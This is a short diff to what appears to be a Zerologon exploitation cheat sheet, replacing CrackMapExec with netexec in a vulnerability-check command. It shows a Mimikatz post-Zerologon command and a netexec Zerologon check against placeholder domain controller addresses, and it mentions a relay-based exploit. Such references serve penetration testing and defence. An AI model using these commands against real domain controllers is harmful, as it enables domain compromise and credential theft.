@@ -75,9 +75,9 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
-* `CrackMapExec` - only check
+* `netexec` - only check
   ```powershell
-  crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
+  netexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
   ```
   
 A 2nd approach to exploit zerologon is done by relaying authentication.
